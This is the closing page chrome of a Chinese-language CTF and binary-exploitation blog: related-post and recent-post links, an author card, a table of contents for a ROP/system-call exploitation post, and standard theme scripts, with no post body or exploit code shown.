href="/2020/11/24/PWN-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E6%A0%88%E6%BA%A2%E5%87%BA-bugku-pwn11/" title="PWN-整数溢出&栈溢出-bugku_pwn11"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-整数溢出&栈溢出-bugku_pwn11</div></div></a></div><div><a href="/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCGfsb/" title="PWN-格式化字符串漏洞-攻防世界CGfsb"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-格式化字符串漏洞-攻防世界CGfsb</div></div></a></div><div><a href="/2021/11/30/ROP-64%E4%BD%8D-ret2libc/" title="ROP-64位-ret2libc"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-30</div><div class="title">ROP-64位-ret2libc</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/51265145?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Re1own</div><div class="author-info__description">Focusing on IoT-Security</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Re1own"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Re1own" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:re1own@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">It's a new start</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">关于系统调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.1.</span> <span class="toc-text">系统调用介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">如何使用系统调用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEgadgets"><span class="toc-number">2.2.</span> <span class="toc-text">寻找gadgets</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/09/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwriteup/" title="No title">No title</a><time datetime="2022-01-09T11:26:15.000Z" title="Created 2022-01-09 19:26:15">2022-01-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/07/DDos%E3%80%81%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/" title="DDos、挖矿木马的逆向分析实战">DDos、挖矿木马的逆向分析实战</a><time datetime="2022-01-07T08:42:26.000Z" title="Created 2022-01-07 16:42:26">2022-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/12/16/%E7%BE%8E%E5%9B%A2CTF-babyrop/" title="美团CTF_babyrop">美团CTF_babyrop</a><time datetime="2021-12-16T09:44:04.000Z" title="Created 2021-12-16 17:44:04">2021-12-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/12/12/%E4%BB%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%B1%82%E9%9D%A2%E7%9A%84%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/" title="从二进制层面的静态分析漏洞检测">从二进制层面的静态分析漏洞检测</a><time datetime="2021-12-12T10:26:21.000Z" title="Created 2021-12-12 18:26:21">2021-12-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/12/10/Apache-log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Apache-log4j漏洞复现">Apache-log4j漏洞复现</a><time datetime="2021-12-10T08:41:30.000Z" title="Created 2021-12-10 16:41:30">2021-12-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Re1own</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="IoT,Security" data-fontsize="20px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
